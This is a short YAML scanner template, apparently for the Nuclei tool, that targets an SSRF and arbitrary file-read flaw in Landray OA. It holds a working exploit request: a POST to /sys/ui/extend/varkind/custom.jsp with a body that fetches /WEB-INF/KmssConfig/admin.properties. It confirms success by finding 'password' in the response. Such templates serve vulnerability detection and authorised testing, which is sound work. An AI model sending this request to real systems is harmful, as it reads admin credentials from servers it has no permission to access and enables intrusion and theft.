id: landray-oa-ssrf-readfile-rce

info:
  name: landray-oa-ssrf-readfile-rce
  author: M9
  severity: critical
  description: 蓝凌OA-SSRF任意文件读取.
  reference: https://mp.weixin.qq.com/s/fNovp4mbKIMkVdF2ywcQcQ
  tags: landray

requests:
  - method: POST
    path:
      - "{{BaseURL}}/sys/ui/extend/varkind/custom.jsp"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "password"
          - "kmss"
        condition: and
      - type: status
        status:
          - 200